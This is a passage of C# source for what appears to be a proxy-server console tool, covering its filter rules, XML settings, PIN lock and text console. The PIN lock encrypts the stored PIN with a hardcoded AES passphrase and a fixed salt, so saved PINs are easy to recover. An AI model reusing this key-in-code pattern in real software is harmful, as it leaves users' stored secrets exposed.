            xml.WriteElementString("filter_state", (started) ? "true" : "false");
            GetSettings(xml);
            xml.WriteEndElement();
        }

        //Implement IDisposable

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();

                ResetAllFilter();
                console = null;
                logger = null;
                filters = null;
                ctx = null;
            }

            disposed = true;
        }

        //Main VFilter class

        Form1 ctx;
        VConsole console;
        VLogger logger;
        public string pRestore;
        public bool selfInteractive;
        public bool started;

        Dictionary<string, Filter> filters = new Dictionary<string, Filter>();

        public struct Filter
        {
            public List<String> equalFilter;
            public List<String> startsWithFilter;
            public List<String> notEqualFilter;
            public List<String> containsFilter;
        }

        public enum Operation : int
        {
            Equals = 0,
            StartsWith = 1,
            NotEquals = 2,
            Contains = 3,
            Undefined = 4
        }

        public VFilter(Form1 context, VConsole conmod)
        {
            ctx = context;
            logger = ctx.LogMod;
            console = conmod;
        }

        public bool IsFilterEmpty(string filterName)
        {
            if (filterName == null) return true;
            if (!filters.ContainsKey(filterName)) return true;
            Filter current = filters[filterName];
            if (current.containsFilter.Count == 0 && current.startsWithFilter.Count == 0 && current.equalFilter.Count == 0 && current.notEqualFilter.Count == 0)
            {
                return true;
            }

            return false;
        }

        public bool CreateFilter(string filterName)
        {
            if (filters.ContainsKey(filterName)) return false;

            Filter f = new Filter();
            f.equalFilter = new List<string>();
            f.startsWithFilter = new List<string>();
            f.notEqualFilter = new List<string>();
            f.containsFilter = new List<string>();

            filters.Add(filterName, f);

            return true;
        }

        public bool Addfilter(string filterName, Operation operation, string value)
        {
            if (!filters.ContainsKey(filterName)) return false;

            Filter currentFilter = filters[filterName];

            if (operation == Operation.Equals) currentFilter.equalFilter.Add(value);
            if (operation == Operation.StartsWith) currentFilter.startsWithFilter.Add(value);
            if (operation == Operation.NotEquals) currentFilter.notEqualFilter.Add(value);
            if (operation == Operation.Contains) currentFilter.containsFilter.Add(value);

            filters[filterName] = currentFilter;

            return true;
        }

        public bool RemoveFilter(string filterName, Operation operation, string value)
        {
            if (!filters.ContainsKey(filterName)) return false;

            Filter currentFilter = filters[filterName];

            if (operation == Operation.Equals) currentFilter.equalFilter.Remove(value);
            if (operation == Operation.StartsWith) currentFilter.startsWithFilter.Remove(value);
            if (operation == Operation.NotEquals) currentFilter.notEqualFilter.Remove(value);
            if (operation == Operation.Contains) currentFilter.containsFilter.Remove(value);

            filters[filterName] = currentFilter;

            return true;
        }

        public bool DestroyFilter(string filterName)
        {
            if (!filters.ContainsKey(filterName)) return false;

            filters.Remove(filterName);

            return true;
        }

        public bool RunEqualCompare(string filterName, string inputValue, out bool isListEmpty)
        {
            isListEmpty = false;
            if (!filters.ContainsKey(filterName)) return false;
            Filter current = filters[filterName];
            if (current.equalFilter.Count == 0) isListEmpty = true;
            foreach (String entry in current.equalFilter)
            {
                if (entry == inputValue) return true;
            }

            return false;
        }

        public bool RunNotEqualCompare(string filterName, string inputValue, out bool isListEmpty)
        {
            isListEmpty = false;
            if (!filters.ContainsKey(filterName)) return false;
            Filter current = filters[filterName];
            if (current.notEqualFilter.Count == 0) isListEmpty = true;
            foreach (String entry in current.notEqualFilter)
            {
                if (entry != inputValue) return true;
            }

            return false;
        }

        public bool RunStartsWithCompare(string filterName, string inputValue, out bool isListEmpty)
        {
            isListEmpty = false;
            if (!filters.ContainsKey(filterName)) return false;
            Filter current = filters[filterName];
            if (current.startsWithFilter.Count == 0) isListEmpty = true;
            foreach (String entry in current.startsWithFilter)
            {
                if (inputValue.StartsWith(entry)) return true;
            }

            return false;
        }

        public bool RunContainsCompare(string filterName, string inputValue, out bool isListEmpty)
        {
            isListEmpty = false;
            if (!filters.ContainsKey(filterName)) return false;
            Filter current = filters[filterName];
            if (current.containsFilter.Count == 0) isListEmpty = true;
            foreach (String entry in current.containsFilter)
            {
                if (inputValue.Contains(entry)) return true;
            }

            return false;
        }

        public bool RunAllCompareAnd(string filterName, string inputValue)
        {
            bool r1 = RunEqualCompare(filterName, inputValue, out bool i1);
            bool r2 = RunNotEqualCompare(filterName, inputValue, out bool i2);
            bool r3 = RunStartsWithCompare(filterName, inputValue, out bool i3);
            bool r4 = RunContainsCompare(filterName, inputValue, out bool i4);

            if (i1) r1 = true;
            if (i2) r2 = true;
            if (i3) r3 = true;
            if (i4) r4 = true;

            if (r1 && r2 && r3 && r4) return true;
            return false;
        }

        public bool RunAllCompareOr(string filterName, string inputValue)
        {
            bool r1 = RunEqualCompare(filterName, inputValue, out bool i1);
            bool r2 = RunNotEqualCompare(filterName, inputValue, out bool i2);
            bool r3 = RunStartsWithCompare(filterName, inputValue, out bool i3);
            bool r4 = RunContainsCompare(filterName, inputValue, out bool i4);

            if (r1 || r2 || r3 || r4) return true;
            return false;
        }

        public void ResetAllFilter()
        {
            filters.Clear();
        }

        public void PrintFilter()
        {
            WriteLine("===========Start of filter list===========");
            WriteLine("Total " + filters.Count.ToString() + " filters");

            foreach (KeyValuePair<String, Filter> kvp in filters)
            {
                WriteLine(kvp.Key);
            }

            WriteLine("============End of filter list============");
        }

        public void PrintRules(string fName)
        {
            if (!filters.ContainsKey(fName)) return;
            Filter current = filters[fName];

            WriteLine("Equal Rules:");

            foreach (string key in current.equalFilter)
            {
                WriteLine("\t" + key);
            }

            WriteLine("Not Equal Rules:");

            foreach (string key in current.notEqualFilter)
            {
                WriteLine("\t" + key);
            }

            WriteLine("Starts With Rules:");

            foreach (string key in current.startsWithFilter)
            {
                WriteLine("\t" + key);
            }

            WriteLine("Contains Rules:");

            foreach (string key in current.containsFilter)
            {
                WriteLine("\t" + key);
            }
        }

        public void GetSettings(System.Xml.XmlWriter xml)
        {
            foreach (KeyValuePair<string, Filter> kvp in filters)
            {
                //Write Start tag for new filter element with name
                xml.WriteElementString("f_name", kvp.Key);
                //Write Start tag for rules of the Filter object
                xml.WriteStartElement("f_equal");
                foreach (String rule in kvp.Value.equalFilter)
                {
                    xml.WriteElementString("f_rule", rule);
                }
                xml.WriteEndElement();

                xml.WriteStartElement("f_not_equal");
                foreach (String rule in kvp.Value.notEqualFilter)
                {
                    xml.WriteElementString("f_rule", rule);
                }
                xml.WriteEndElement();

                xml.WriteStartElement("f_starts_with");
                foreach (String rule in kvp.Value.startsWithFilter)
                {
                    xml.WriteElementString("f_rule", rule);
                }
                xml.WriteEndElement();

                xml.WriteStartElement("f_contains");
                foreach (String rule in kvp.Value.containsFilter)
                {
                    xml.WriteElementString("f_rule", rule);
                }
                xml.WriteEndElement();
            }
        }

        private void WriteLine(string text)
        {
            if (selfInteractive) console.WriteLine(text, "ig.vfman");
            else console.WriteLine(text);
        }
    }

    public class VSettings : IDisposable
    {
        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                defaultDir = null;
                fileLocation = null;
                console = null;
                ctx = null;
                pinManager = null;
                logger = null;
                if (objlist != null) Array.Clear(objlist, 0, objlist.Length);
                objlist = null;
            }

            disposed = true;
        }

        string defaultDir;
        string fileLocation;
        VConsole console;
        Form1 ctx;
        VPin pinManager;
        VLogger logger;
        object[] objlist;

        public VSettings(Form1 context, VConsole con, VPin pm, VLogger log)
        {
            ctx = context;
            console = con;
            pinManager = pm;
            logger = log;
        }

        public void DefineDirectory(string dir)
        {
            defaultDir = dir;
            if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
        }

        public void SetupObjects(params object[] arg)
        {
            objlist = arg;
        }

        public void FindFile(string file)
        {
            foreach (string entry in Directory.GetFiles(defaultDir))
            {
                if (new FileInfo(entry).Name == file + ".xml")
                {
                    fileLocation = entry;
                }
            }
        }

        public string GetFileLocation()
        {
            return fileLocation;
        }

        public void Load()
        {
            if (!File.Exists(fileLocation))
            {
                ctx.LogMod.Log("File Not Found: " + fileLocation + "\r\n\tSetting not loaded!", VLogger.LogLevel.error);
                return;
            }

            using (System.Xml.XmlReader xml = System.Xml.XmlReader.Create(fileLocation))
            {
                List<KeyValuePair<string, string>> tKvp = new List<KeyValuePair<string, string>>();
                bool appendMode = false;
                int objListPointer = 0;

                while (xml.Read())
                {
                    string elementName = xml.Name;

                    if (xml.IsEmptyElement) continue;

                    if (xml.IsStartElement())
                    {
                        if (appendMode)
                        {
                            string cElement = elementName;
                            xml.Read();
                            string nValue = xml.Value;

                            while (nValue == "")
                            {
                                tKvp.Add(new KeyValuePair<string, string>(cElement, ""));
                                cElement = xml.Name;
                                xml.Read();
                                nValue = xml.Value;
                            }

                            KeyValuePair<string, string> current = new KeyValuePair<string, string>(cElement, nValue);
                            tKvp.Add(current);
                        }

                        switch (elementName)
                        {
                            case "settings_start":
                                appendMode = true;
                                tKvp.Clear();
                                break;
                        }
                    }
                    else
                    {
                        //Ending elements can be handled here

                        if (elementName == "settings_start")
                        {
                            appendMode = false;
                            ISettings currentObj = (ISettings)objlist[objListPointer];
                            foreach (KeyValuePair<string, string> kvp in tKvp)
                            {
                                currentObj.LoadSettings(kvp);
                            }

                            tKvp.Clear();
                            objListPointer++;
                        }
                    }
                }
            }
        }

        public void Save(string filename)
        {
            if (File.Exists(defaultDir + "\\" + filename + ".xml"))
            {
                bool result = console.ChoicePrompt("The file name you specified already exists.\r\nDo you want to overwrite it?");
                if (result) File.Delete(defaultDir + "\\" + filename + ".xml");
                else return;
            }

            using (System.Xml.XmlWriter xml = System.Xml.XmlWriter.Create(defaultDir + "\\" + filename + ".xml"))
            {
                xml.WriteStartDocument();
                xml.WriteStartElement("proxyServer");
                foreach (object obj in objlist)
                {
                    ISettings iso = (ISettings)obj;
                    iso.WriteSettings(xml);
                }
                /*//Write Main Options (Form1)
                ctx.WriteSettings(xml);
                //Write Console Options (VConsole)
                console.WriteSettings(xml);
                //Write Pin Options (VPin)
                pinManager.WriteSettings(xml);
                if (ctx.server != null) ctx.server.WriteSettings(xml);
                //Write Filters (VFilter)
                ctx.vf.WriteSettings(xml);
                //Write Logger Options (VLogger)
                logger.WriteSettings(xml);
                //Write SSL Certificate Options (VSslCertificate)
                ctx.CertMod.WriteSettings(xml);
                //Write ending tags*/
                xml.WriteEndElement();
                xml.WriteEndDocument();
            }

            ctx.LogMod.Log("Settings Saved to: " + defaultDir + "\\" + filename + ".xml", VLogger.LogLevel.information);
        }

        private void CreateServer()
        {
            if (ctx.server == null) ctx.server = new ProxyServer(ctx.ip, ctx.port, ctx.pendingConnectionLimit, console, ctx);
        }
    }

    public class VPin : IDisposable, ISettings
    {
        //ISettings Implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "pinmanager") isEnable = (value == "true") ? true : false;
            if (key == "pin") SetPin(kvp.Value);
            if (key == "pin_exclude") Exclude(kvp.Value);
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("pinManager", (isEnable) ? "true" : "false");
            if (isSet && pin != null) xml.WriteElementString("pin", Encrypt(pin));
            foreach (string entry in excludeList)
            {
                xml.WriteElementString("pin_exclude", entry);
            }
            xml.WriteEndElement();
        }

        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                pin = null;
                console = null;
                excludeList = null;
            }

            disposed = true;
        }

        //Main pin manager class

        private string pin;
        private VConsole console;
        public bool isSet = false;
        public bool isEnable = true;
        private String[] excludeList;
        private VLogger logger;

        public void SetConsole(VConsole cInterface)
        {
            console = cInterface;
        }

        public void SetLogger(VLogger lInterface)
        {
            logger = lInterface;
        }

        public void SetPin(string input)
        {
            Thread t = new Thread(new ParameterizedThreadStart(SetPinThread));
            t.Start(input);
        }

        private void SetPinThread(object obj)
        {
            string input = (string)obj;

            if (pin != "" && pin != null)
            {
                string backup = console.GetPrompt();

                console.SetPrompt("Type in the current pin: ");
                console.IgnoreNextInput();
                string chkPin = console.ReadLine();
                if (chkPin == pin)
                {
                    /*console.SetPrompt("Type in the new pin: ");
                    console.IgnoreNextInput();
                    string newPin = console.ReadLine();
                    pin = newPin;*/
                    pin = input;
                    console.WriteLine("PIN Changed!");
                    console.SetPrompt(backup);
                }
                else
                {
                    console.WriteLine("Invalid PIN!");
                    console.SetPrompt(backup);
                }
            }
            else
            {
                pin = input;
                console.WriteLine("PIN Changed!");
            }

            if (!isSet) isSet = true;
        }

        public void Exclude(string command_starting_text)
        {
            if (excludeList == null)
            {
                excludeList = new String[1];
                List<String> s = excludeList.ToList();
                s.RemoveAt(0);
                excludeList = s.ToArray();
            }
            List<String> temp = excludeList.ToList();
            temp.Add(command_starting_text);
            excludeList = temp.ToArray();
        }

        public void ReInclude(string command_starting_text)
        {
            if (excludeList == null) return;
            List<String> temp = excludeList.ToList();
            temp.Remove(command_starting_text);
            excludeList = temp.ToArray();
        }

        private bool IsExclude(string command)
        {
            if (excludeList == null) return false;

            foreach (string text in excludeList)
            {
                if (command.StartsWith(text)) return true;
            }

            return false;
        }

        public bool CheckPin(string command)
        {
            bool isValid = false;

            if (IsExclude(command)) return true;

            string backup = console.GetPrompt();
            console.SetPrompt("Please type in the current PIN code: ");
            console.IgnoreNextInput();
            console.HideNextInput();
            string input = console.ReadLine();
            if (input == pin)
            {
                isValid = true;
            }
            else
            {
                logger.Log("Invalid Pin!", VLogger.LogLevel.error);
            }

            console.SetPrompt(backup);
            return isValid;
        }

        public string GetPin()
        {
            return pin;
        }

        private string Encrypt(string clearText)
        {
            string EncryptionKey = "adbuuibsauvauzfbai3246378634985723zsdibfasfsuzfYGSGDFYGVB";
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76, 0x66, 0x42, 0x22, 0x47, 0x88 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            return clearText;
        }

        private string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "adbuuibsauvauzfbai3246378634985723zsdibfasfsuzfYGSGDFYGVB";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76, 0x66, 0x42, 0x22, 0x47, 0x88 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception e)
            {
                console.Debug("decryption error: " + e.Message);
                return cipherText;
            }
        }
    }

    public class VConsole : IDisposable, ISettings
    {
        //ISettings implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "fgColor") SetForeground(ctx.S2c(value));
            if (key == "bgColor") SetBackground(ctx.S2c(value));
            if (key == "font_size") SetTextSize(float.Parse(value));
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("fgColor", ctx.C2s(fg));
            xml.WriteElementString("bgColor", ctx.C2s(bg));
            xml.WriteElementString("font_size", Convert.ToString(GetTextSize()));
            xml.WriteEndElement();
        }

        //IDisposable implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (ctx.InvokeRequired)
            {
                BoolDelegate c = new BoolDelegate(Dispose);
                ctx.Invoke(c, new object[] { disposing });
                return;
            }

            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                bg = System.Drawing.Color.Empty;
                fg = System.Drawing.Color.Empty;
                ctx = null;
                input.Dispose();
                output.Dispose();
                input = null;
                output = null;
                prefix = null;
                tempText = null;
                defaultXDifference = 0;
                defaultYDifference = 0;
                outputBuffer = null;
                hidden.Dispose();
                hidden = null;
                history.Clear();
                hIndex = 0;
            }

            disposed = true;
        }

        private delegate void VoidDelegate();
        private delegate void StrDelegate(string text);
        private delegate void DoubleStrDelegate(string t1, string t2);
        private delegate void BoolDelegate(bool value);
        private delegate void ColorDelegate(System.Drawing.Color color);
        private delegate void FloatDelegate(float value);
        private delegate void FontDelegate(System.Drawing.Font font);
        private delegate void BindDelegate(TextBox t1, TextBox t2);
        private delegate void SyncDelegate(int x, int y, bool overwrite);
        private delegate float ReturnFloatDelegate();
        private delegate System.Drawing.Color ReturnColorDelegate();
        private delegate string ReturnStringDelegate();

        public enum SyncMode : int
        {
            noSync = 1,
            syncWindow = 2,
            syncIO = 3
        }

        public class ReadLineEventArgs : EventArgs
        {
            private string text;

            public ReadLineEventArgs(string msg)
            {
                text = msg;
            }

            public string Text
            {
                get
                {
                    return text;
                }
            }
        }

        public delegate void ReadLineEventHandler(object obj, ReadLineEventArgs args);

        public event ReadLineEventHandler OnReadLine;

        System.Drawing.Color bg;
        System.Drawing.Color fg;
        Form1 ctx;
        TextBox input;
        TextBox output;
        string prefix = "";
        string tempText = "";
        SyncMode sync = SyncMode.noSync;
        int defaultXDifference;
        int defaultYDifference;
        bool supressEvent = false;
        bool freezWrite = false;
        string outputBuffer = "";
        bool choiceMode = false;
        bool ignoreNext = false;
        bool hideNext = false;
        bool historyNext = false;
        TextBox hidden = new TextBox();
        List<string> history = new List<string>();
        int hIndex = -1;
        public bool isDebug = false;
        private string ActiveIG = "ig.null";
        public string prevCommand = "";

        public VConsole(Form1 context, SyncMode syncSize)
        {
            ctx = context;
            sync = syncSize;
        }

        public void SyncUI(int growthX, int growthY, bool allowDefaultModify = true)
        {
            if (ctx.InvokeRequired)
            {
                SyncDelegate c = new SyncDelegate(SyncUI);
                ctx.Invoke(c, new object[] { growthX, growthY, allowDefaultModify });
                return;
            }

            if (sync == SyncMode.syncIO)
            {
                if (growthX != 0) input.Size = new System.Drawing.Size(input.Size.Width + growthX, input.Size.Height);
                output.Size = new System.Drawing.Size(output.Size.Width + growthX, output.Size.Height + growthY);
                input.Location = new System.Drawing.Point(input.Location.X, output.Size.Height + 1);
                if (allowDefaultModify)
                {
                    defaultXDifference = ctx.Size.Width - output.Size.Width;
                    defaultYDifference = ctx.Size.Height - output.Size.Height;
                }
            }

            if (sync == SyncMode.syncWindow)
            {
                ctx.Size = new System.Drawing.Size(ctx.Size.Width + growthX, ctx.Size.Height + growthY + 4);
                if (allowDefaultModify)
                {
                    defaultXDifference = input.Size.Width - ctx.Size.Width;
                    defaultYDifference = input.Size.Height - ctx.Size.Height;
                }
            }
        }

        public void Bind(TextBox inputBox, TextBox outputBox)
        {
            if (ctx.InvokeRequired)
            {
                BindDelegate c = new BindDelegate(Bind);
                ctx.Invoke(c, new object[] { inputBox, outputBox });
                return;
            }
            input = inputBox;
            output = outputBox;
        }

        public void SetFont(System.Drawing.Font font)
        {
            if (ctx.InvokeRequired)
            {
                FontDelegate c = new FontDelegate(SetFont);
                ctx.Invoke(c, new object[] { font });
                return;
            }
            supressEvent = true;
            int inputX = input.Size.Width;
            int inputY = input.Size.Height;

            input.Font = font;
            output.Font = font;

            System.Drawing.Size nSize = TextRenderer.MeasureText("T", font);
            input.Size = new System.Drawing.Size(input.Size.Width, nSize.Height + 4); //+4 for the cursor to display
            if (sync != SyncMode.syncWindow)
            {
                SyncMode backup = sync;
                sync = SyncMode.syncWindow;
                SyncUI(nSize.Width - inputX, nSize.Height - inputY, false);
                sync = backup;
            }
            supressEvent = false;
        }

        public void SetTextSize(float textSize)
        {
            if (ctx.InvokeRequired)
            {
                FloatDelegate c = new FloatDelegate(SetTextSize);
                ctx.Invoke(c, new object[] { textSize });
                return;
            }
            supressEvent = true;
            System.Drawing.Font f = new System.Drawing.Font(input.Font.FontFamily, textSize);
            int inputX = input.Size.Width;
            int inputY = input.Size.Height;

            output.Font = f;

            System.Drawing.Size nSize = TextRenderer.MeasureText("T", f);
            input.Size = new System.Drawing.Size(input.Size.Width, nSize.Height + 4); //+4 for the cursor to display
            if (sync != SyncMode.syncWindow)
            {
                SyncMode backup = sync;
                sync = SyncMode.syncWindow;
                SyncUI(input.Size.Width - inputX, nSize.Height - inputY, false);
                sync = backup;
            }

            input.Font = f;
            supressEvent = false;
        }

        public void SetBackground(System.Drawing.Color color)
        {
            if (ctx.InvokeRequired)
            {
                ColorDelegate c = new ColorDelegate(SetBackground);
                ctx.Invoke(c, new object[] { color });
                return;
            }
            bg = color;
            output.BackColor = bg;
            input.BackColor = bg;
        }

        public void SetForeground(System.Drawing.Color color)
        {
            if (ctx.InvokeRequired)
            {
                ColorDelegate c = new ColorDelegate(SetForeground);
                ctx.Invoke(c, new object[] { color });
                return;
            }
            fg = color;
            output.ForeColor = fg;
            input.ForeColor = fg;
        }

        public System.Drawing.Color GetForeground()
        {
            if (ctx.InvokeRequired)
            {
                ReturnColorDelegate c = new ReturnColorDelegate(GetForeground);
                return (System.Drawing.Color) ctx.Invoke(c);
            }
            else return input.ForeColor;
        }

        public System.Drawing.Color GetBackground()
        {
            if (ctx.InvokeRequired)
            {
                ReturnColorDelegate c = new ReturnColorDelegate(GetBackground);
                return (System.Drawing.Color) ctx.Invoke(c);
            }
            else return input.BackColor;
        }

        public void Clear()
        {
            if (ctx.InvokeRequired)
            {
                VoidDelegate c = new VoidDelegate(Clear);
                ctx.Invoke(c);
            }
            else output.Text = "";
        }

        public void SetPrompt(string text)
        {
            if (ctx.InvokeRequired)
            {
                StrDelegate c = new StrDelegate(SetPrompt);
                ctx.Invoke(c, new object[] { text });
            }
            else
            {
                prefix = text;
                input.Text = prefix;
                input.Select(input.Text.Length, 0);
            }
        }

        public void Setup()
        {
            if (ctx.InvokeRequired)
            {
                VoidDelegate c = new VoidDelegate(Setup);
                ctx.Invoke(c);
                return;
            }
            input.KeyDown += new KeyEventHandler(KeyEvent);
            output.GotFocus += new EventHandler(OutputFocused);
            output.ReadOnly = true;
            output.ScrollBars = ScrollBars.Vertical;
            output.Multiline = true;
            input.Focus();
            output.TabIndex = 1;
            input.TabIndex = 0;
            input.Multiline = true;
            
            if (sync == SyncMode.syncIO)
            {
                ctx.SizeChanged += new EventHandler(FormSizeEvent);
                defaultXDifference = ctx.Size.Width - output.Size.Width;
                defaultYDifference = ctx.Size.Height - output.Size.Height;
            }

            if (sync == SyncMode.syncWindow)
            {
                input.SizeChanged += new EventHandler(InputSizeChanged);
                defaultXDifference = input.Size.Width - ctx.Size.Width;
                defaultYDifference = input.Size.Height - ctx.Size.Height;
            }
        }

        private void OutputFocused(object sender, EventArgs e)
        {
            input.Focus();
        }

        private void InputSizeChanged(object sender, EventArgs e)
        {
            int inputX = input.Size.Width;
            int inputY = input.Size.Height;
            int ctxX = ctx.Size.Width;
            int ctxY = ctx.Size.Height;

            int xDiff = inputX - ctxX;
            int yDiff = inputY - ctxY;

            int alterDiffX = defaultXDifference - xDiff;
            int alterDiffY = defaultYDifference - yDiff;

            SyncUI(-alterDiffX, -alterDiffY);
        }

        private void FormSizeEvent(object sender, EventArgs e)
        {
            int ctxX = ctx.Size.Width;
            int ctxY = ctx.Size.Height;
            int inputX = output.Size.Width;
            int inputY = output.Size.Height;

            int xDiff = ctxX - inputX;
            int yDiff = ctxY - inputY;

            int alterDiffX = defaultXDifference - xDiff;
            int alterDiffY = defaultYDifference - yDiff;

            if (supressEvent)
            {
                defaultXDifference = ctx.Size.Width - output.Size.Width;
                defaultYDifference = ctx.Size.Height - output.Size.Height;
                return;
            }

            SyncUI(-alterDiffX, -alterDiffY);
        }

        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (historyNext && e.KeyCode != Keys.Enter)
            {
                historyNext = false;
            }

            if (hideNext)
            {
                string chr = (new KeysConverter().ConvertToString(e.KeyCode));

                hidden.SelectionStart = input.SelectionStart - prefix.Length;
                hidden.SelectionLength = input.SelectionLength;

                if (chr == "Back")
                {
                    HiddenBackspace();
                }
                else if (chr.Length == 1)
                {
                    hidden.Text += chr;
                    input.Text += "X";
                    e.SuppressKeyPress = true;
                    input.Select(input.Text.Length, 0);
                }
                else
                {
                    e.SuppressKeyPress = true;
                    input.Select(input.Text.Length, 0);
                }
            }

            if (e.KeyCode == Keys.Enter)
            {
                string command = input.Text.Substring(prefix.Length);

                if (!hideNext && !choiceMode && !ignoreNext && !command.StartsWith("set pin "))
                {
                    history.Add(command);
                    if (!historyNext) hIndex = history.Count;
                    else historyNext = false;
                    prevCommand = command;
                }

                if (hideNext)
                {
                    tempText = hidden.Text;
                    hidden = new TextBox();
                    hideNext = false;
                }
                else tempText = command;
                ReadLineEventArgs args = new ReadLineEventArgs(command);
                if (!choiceMode && !ignoreNext) OnReadLine?.Invoke(this, args);
                if (ignoreNext) ignoreNext = false;
                input.Clear();
                input.Text = String.Empty;
                input.Text = prefix;
                input.Select(input.Text.Length, 0);
                input.Text = input.Text.Replace("\r\n", String.Empty);
                input.Text = input.Text.Trim();
                e.SuppressKeyPress = true;
            }

            if (e.KeyCode == Keys.Back || e.KeyCode == Keys.Left)
            {
                if (input.SelectionStart <= prefix.Length)
                {
                    e.SuppressKeyPress = true;
                }
            }

            if (e.KeyCode == Keys.Home && !hideNext)
            {
                input.Select(prefix.Length, 0);
                e.SuppressKeyPress = true;
            }

            if (e.KeyCode == Keys.Up && !hideNext)
            {
                if (hIndex > 0) hIndex -= 1;
                if (hIndex != -1) LoadHistory();
            }

            if (e.KeyCode == Keys.Down && !hideNext)
            {
                if ((hIndex + 1) == history.Count) hIndex += 1;

                if (hIndex >= history.Count)
                {
                    input.Text = prefix;
                    input.Select(input.Text.Length, 0);
                    return;
                }
                hIndex += 1;
                LoadHistory();
            }
        }

        private void LoadHistory()
        {
            if (hIndex >= history.Count) return;
            string command = history[hIndex];
            input.Text = prefix + command;
            input.Select(input.Text.Length, 0);
            historyNext = true;
        }

        private void HiddenBackspace()
        {
            int cutLength = hidden.SelectionStart + hidden.SelectionLength;
            string part1 = hidden.Text.Substring(0, hidden.SelectionStart - 1);
            string part2 = hidden.Text.Substring(cutLength, hidden.Text.Length - cutLength);
            hidden.Text = String.Concat(part1, part2);
        }

        public void SetTitle(string title)
        {
            if (ctx.InvokeRequired)
            {
                StrDelegate c = new StrDelegate(SetTitle);
                ctx.Invoke(c, new object[] { title });
            }
            else
            {
                ctx.Text = title;
            }
        }

        public void WriteLine(string message, string interactiveGroup = "ig.null")
        {
            if (ctx.InvokeRequired)
            {
                DoubleStrDelegate c = new DoubleStrDelegate(WriteLine);
                ctx.Invoke(c, new object[] { message, interactiveGroup });
            }
            else
            {
                if (interactiveGroup != ActiveIG) return;
                string backup = output.Text;
                string nl = Environment.NewLine;
                if (backup != "") backup += nl + message;
                else backup += message;
                if (freezWrite)
                {
                    outputBuffer += nl + message;
                    return;
                }
                output.Text = backup;
                output.Select(output.Text.Length - 1, 0);
                output.ScrollToCaret();
                output.Select(0, 0);
                if (ctx._ipcClient != null) ctx._ipcClient.WriteStream(backup);
            }
        }

        public void SetInteractiveGroup(string igName)
        {
            ActiveIG = igName;
        }

        public string GetIntercativeGroup()
        {
            if (ctx.InvokeRequired)
            {
                ReturnStringDelegate c = new ReturnStringDelegate(GetIntercativeGroup);
                return (String) ctx.Invoke(c);
            }
            else
            {
                return ActiveIG;
            }
        }

        public void Write(string message)
        {
            if (ctx.InvokeRequired)
            {
                StrDelegate c = new StrDelegate(Write);
                ctx.Invoke(c, new object[] { message });
            }
            else
            {
                string backup = output.Text;
                backup += message;
                if (freezWrite)
                {
                    outputBuffer += message;
                    return;
                }
                output.Text = backup;
                output.Select(output.Text.Length, 0);
                output.ScrollToCaret();
                output.Select(0, 0);
                if (ctx._ipcClient != null) ctx._ipcClient.WriteStream(backup);
            }
        }

        public string ReadLine()
        {
            tempText = "";
            ManualResetEvent waitForText = new ManualResetEvent(false);
            Thread t = new Thread(new ParameterizedThreadStart(ReadThread));
            t.Start(waitForText);
            waitForText.WaitOne();
            string backup = tempText;
            tempText = "";
            return backup;
        }

        private void ReadThread(object mre)
        {
            ManualResetEvent wait = (ManualResetEvent)mre;

            while (true)
            {
                if (tempText != "")
                {
                    wait.Set();
                    break;
                }
            }
        }

        public bool ChoicePrompt(string question)
        {
            choiceMode = true;
            bool result = false;
            outputBuffer = output.Text;
            freezWrite = true;
            SetOutputText(question);
            string backup = prefix;
            SetPrompt("[Y/N]");
            string choice = ReadLine();
            choice = choice.ToLower();
